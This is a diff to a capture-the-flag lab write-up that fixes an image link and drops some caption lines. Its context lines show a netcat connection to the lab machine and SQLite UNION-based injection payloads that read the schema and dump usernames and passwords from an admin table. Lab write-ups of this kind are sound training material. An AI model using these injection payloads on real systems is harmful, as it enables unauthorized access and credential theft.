@@ -33,7 +33,7 @@ The room description hints at connecting to the machine via netcat on port `1337
 nc MACHINE_IP 1337
 ```
 
-![Light_1](src/Light_1)
+![Light_1](src/Light_1.png)
 
 We're greeted by a minimal login interface. We try logging in with:
 
@@ -107,8 +107,6 @@ Now, let’s enumerate the schema via the `sqlite_master` table:
 ' Union Select sql From sqlite_master '
 ```
 
-This returns the table schema:
-
 ![Light_2](src/Light_2.png)
 
 Perfect. Now let’s extract the data.
@@ -119,8 +117,6 @@ To list usernames:
 ' Union Select group_concat(username) From admintable '
 ```
 
-Result:
-
 ![Light_3](src/Light_3.png)
 
 Then for passwords:
@@ -128,8 +124,6 @@ Then for passwords:
 ```sql
 ' Union Select group_concat(password) From admintable '
 ```
-
-And we get:
 
 ![Light_4](src/Light_4.png)
 
